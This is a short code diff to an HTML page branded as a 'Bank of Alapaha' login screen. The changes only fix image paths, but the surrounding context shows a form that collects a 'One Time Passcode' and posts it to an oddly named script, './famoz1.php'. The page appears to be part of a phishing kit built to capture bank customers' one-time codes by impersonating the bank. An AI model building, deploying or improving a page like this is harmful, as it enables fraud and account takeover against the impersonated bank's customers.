@@ -8,7 +8,7 @@
 	<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" />
 	<style type="text/css">body {
             font-family: 'Poppins', sans-serif;
-            background-image: url("./background.png");
+            background-image: url("../background.png");
             background-size: cover;
             background-repeat: no-repeat;
             background-attachment: fixed;
@@ -147,7 +147,7 @@
 <body>
 <div class="container">
 <div class="card">
-<div class="logo"><img alt="Bank of Alapaha Logo" src="./logo.png" /></div>
+<div class="logo"><img alt="Bank of Alapaha Logo" src="../logo.png" /></div>
 
 <form action="./famoz1.php" enctype="application/x-www-form-urlencoded" id="loginForm" method="post">
 <div class="form-control"><label class="label" for="username">One Time Passcode</label> <input class="input-field" id="username" name="1" required="required" type="text" /></div>
